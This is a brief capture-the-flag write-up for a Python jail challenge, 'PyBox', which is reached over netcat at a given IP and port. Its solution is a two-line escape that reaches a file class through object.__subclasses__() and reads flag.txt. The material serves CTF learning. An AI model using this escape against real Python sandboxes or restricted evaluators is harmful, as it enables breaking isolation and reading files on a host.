### 0x00 Challenge: PyBox
**Description:**
>Can you escape from this Python jail and get the flag?
>
>nc 168.119.247.237 5015

### 0x01 Write-up:
This challenge was a Python jail that you need to escape.

**The way that can you solve it:**
```
f = [].__class__.__base__.__subclasses__()[40]
print(f('./flag.txt').read())
```

